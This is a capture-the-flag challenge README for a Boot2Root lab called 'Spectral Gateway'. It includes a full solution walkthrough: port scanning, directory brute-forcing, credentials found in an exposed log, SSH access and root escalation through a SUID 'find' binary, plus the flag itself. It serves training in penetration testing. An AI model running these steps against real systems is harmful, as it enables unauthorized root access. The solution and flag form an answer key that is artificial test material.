# Spectral Gateway

## Challenge Description
The local paranormal investigation team has received reports of strange server activity in an abandoned data center. The IT security specialists suspect that a ghost in the machine might be controlling a forgotten web server. Your mission is to infiltrate the server, gain access, and escalate your privileges to discover what entity has taken control of the system.

## Difficulty
Easy

## Category
Boot2Root

## Setup Instructions
```bash
cd Boot2Root/Challenge\ 1/
docker-compose up -d
```

## Hints
1. Forgotten web directories often contain valuable information.
2. System logs can reveal more than just errors.
3. Always check what commands can be run with elevated privileges.
4. The ghost keeps everything related to "apparitions" and "spectral".

## Solution
1. Enumeration:
   ```bash
   # Port scan reveals port 80 (HTTP) is open
   nmap -sV target_ip
   ```

2. Directory Discovery:
   ```bash
   # Use directory brute forcing to find hidden directories
   gobuster dir -u http://target_ip -w /usr/share/wordlists/dirb/common.txt
   # Discover the /apparitions directory
   ```

3. Credential Extraction:
   - Navigate to http://target_ip/apparitions/
   - Find and review server_logs.txt to discover credentials:
   ```
   [2023-05-01 03:15:45] User 'specter' successful login with password 'Gh0stHunt3r!'
   ```

4. Initial Access:
   ```bash
   # SSH into the server as user 'specter'
   ssh specter@target_ip
   # Password: Gh0stHunt3r!
   ```

5. Privilege Escalation:
   ```bash
   # Check SUID binaries
   find / -perm -u=s -type f 2>/dev/null
   # Find that the 'find' command has the SUID bit set
   # Exploit the SUID bit to get root
   find . -exec /bin/sh -p \; -quit
   # Get root access and read the flag
   cat /root/flag.txt
   ```

## Flag
```
flag{sp3ctral_pr1v1leg3_3scalat1on}
``` 